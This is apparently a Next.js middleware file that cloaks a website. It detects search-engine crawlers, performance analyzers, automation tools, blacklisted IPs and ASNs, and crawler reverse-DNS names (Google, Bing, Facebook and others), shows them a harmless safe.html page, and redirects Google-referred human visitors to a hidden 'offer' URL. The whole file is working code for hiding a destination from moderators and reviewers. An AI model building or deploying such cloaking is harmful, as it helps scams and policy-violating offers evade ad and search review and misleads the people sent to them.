import { NextRequest, NextResponse, userAgent } from 'next/server'
import { getOfferUrlRuntime } from './utils/config'
import {
  computeScore,
  getIP,
  hasHumanActivity,
  isBanned,
  isBlacklistedASN,
  isBlacklistedIP,
  isBlockedUserAgent,
  isStaticAssetPath,
  reversePTRMatches,
  fingerprintValid,
  getASN,
  isAnalyzerRequest,
  isLikelyBrowserAutomation,
  isTrustedGoogleRef,
} from './utils/botCheck'

async function logDecision(req: NextRequest, decision: 'offer' | 'safe' | 'challenge' | 'bypass', reasons: string[], score?: number) {
  try {
    const origin = req.nextUrl.origin
    const payload = {
      ts: Date.now(),
      path: req.nextUrl.pathname,
      ip: getIP(req),
      ua: req.headers.get('user-agent') || '',
      asn: getASN(req),
      country: (req as any)?.cf?.country || req.geo?.country || req.headers.get('cf-ipcountry') || null,
      decision,
      reasons,
      score: score ?? null,
    }
    // Fire-and-forget; don't block middleware
    fetch(`${origin}/api/logs`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload),
      // keepalive hints the platform to allow it after response
      keepalive: true as any,
    }).catch(() => {})
  } catch {
    // ignore logging errors
  }
}

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl

  const makeRewrite = (path: string, decision: 'offer'|'safe'|'bypass'|'challenge', reasons: string[]) => {
    const res = NextResponse.rewrite(new URL(path, req.url))
    res.headers.set('x-cloak-decision', decision)
    if (reasons.length) res.headers.set('x-cloak-reasons', reasons.join(','))
    res.headers.set('cache-control', 'private, no-store')
    return res
  }

  const makeRedirect = (url: string, reasons: string[]) => {
    const res = NextResponse.redirect(url)
    res.headers.set('x-cloak-decision', 'offer')
    if (reasons.length) res.headers.set('x-cloak-reasons', reasons.join(','))
    res.headers.set('cache-control', 'private, no-store')
    return res
  }

  // Activation gate: resolve offer URL (Edge Config or env). If absent, Safe Mode.
  const OFFER_URL = await getOfferUrlRuntime()
  if (!OFFER_URL) {
    // Allow assets, _next, api, and safe.html itself
    if (
      pathname.startsWith('/_next') ||
      pathname.startsWith('/api/') ||
      pathname === '/safe.html' ||
      isStaticAssetPath(pathname)
    ) {
      await logDecision(req, 'bypass', ['inactive:env-missing'])
      const res = NextResponse.next()
      res.headers.set('x-cloak-decision', 'bypass')
      res.headers.set('x-cloak-reasons', 'inactive:env-missing')
      return res
    }
    await logDecision(req, 'safe', ['inactive:env-missing'])
    return makeRewrite('/safe.html', 'safe', ['inactive:env-missing'])
  }

  // Allow these paths to pass through without cloaking
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api/') ||
    pathname === '/hc' ||
    pathname === '/safe.html' ||
    pathname === '/offer.html' ||
    isStaticAssetPath(pathname)
  ) {
    await logDecision(req, 'bypass', ['matcher:excluded'])
    const res = NextResponse.next()
    res.headers.set('x-cloak-decision', 'bypass')
    res.headers.set('x-cloak-reasons', 'matcher:excluded')
    return res
  }

  // Allowlist: real browser traffic coming from Google search results
  if (isTrustedGoogleRef(req)) {
    await logDecision(req, 'offer', ['allow:google-ref'])
    if (OFFER_URL) return makeRedirect(OFFER_URL, ['allow:google-ref'])
    return makeRewrite('/offer.html', 'offer', ['allow:google-ref'])
  }

  // Hard bans (skip for Google-ref allowlisted traffic)
  if (isBanned(req)) {
    await logDecision(req, 'safe', ['cookie:ban'])
    return makeRewrite('/safe.html', 'safe', ['cookie:ban'])
  }

  const uaStr = req.headers.get('user-agent')
  const { isBot: uaBot } = (() => {
    const r = isBlockedUserAgent(uaStr)
    return { isBot: r.blocked }
  })()
  if (uaBot) {
    await logDecision(req, 'safe', ['ua:blocklist'])
    return makeRewrite('/safe.html', 'safe', ['ua:blocklist'])
  }

  // Block common performance analyzers (PageSpeed/Lighthouse/etc.)
  if (isAnalyzerRequest(req)) {
    await logDecision(req, 'safe', ['analyzer:detected'])
    return makeRewrite('/safe.html', 'safe', ['analyzer:detected'])
  }

  // Block likely browser automation even with generic UA
  const auto = isLikelyBrowserAutomation(req)
  if (auto.flag) {
    await logDecision(req, 'safe', ['automation:suspect', ...auto.reasons])
    return makeRewrite('/safe.html', 'safe', ['automation:suspect', ...auto.reasons])
  }

  const ip = getIP(req)
  if (isBlacklistedIP(ip)) {
    await logDecision(req, 'safe', ['ip:blacklist'])
    return makeRewrite('/safe.html', 'safe', ['ip:blacklist'])
  }

  const asn = getASN(req)
  if (isBlacklistedASN(asn as any)) {
    await logDecision(req, 'safe', ['asn:blacklist'])
    return makeRewrite('/safe.html', 'safe', ['asn:blacklist'])
  }

  // Reverse DNS PTR for known crawler domains
  const isPtrBot = await reversePTRMatches(ip, [
    /\.googlebot\.com\.?$/i,
    /\.search\.msn\.com\.?$/i,
    /\.crawl\.yahoo\.net\.?$/i,
    /\.baidu\.com\.?$/i,
    /\.yandex\.ru\.?$/i,
    /\.facebook\.com\.?$/i,
  ])
  if (isPtrBot) {
    await logDecision(req, 'safe', ['ptr:bot'])
    return makeRewrite('/safe.html', 'safe', ['ptr:bot'])
  }

  // No visible challenge: proceed to scoring based on passive signals

  // ML-lite scoring
  const { score, factors } = computeScore(req)
  const threshold = 50
  if (score < threshold) {
    await logDecision(req, 'safe', ['ml:low', `score:${score}`, ...factors], score)
    return makeRewrite('/safe.html', 'safe', ['ml:low', `score:${score}`, ...factors])
  }

  // Passed: send to offer immediately
  await logDecision(req, 'offer', ['ml:pass', `score:${score}`, ...factors], score)
  if (OFFER_URL) return makeRedirect(OFFER_URL, ['ml:pass', `score:${score}`, ...factors])
  return makeRewrite('/offer.html', 'offer', ['ml:pass', `score:${score}`, ...factors])
}

export const config = {
  matcher: ['/((?!_next|api|.*\\.(?:png|jpg|jpeg|gif|svg|ico|css|js|map|txt|webp|woff2?|ttf|eot)).*)'],
}
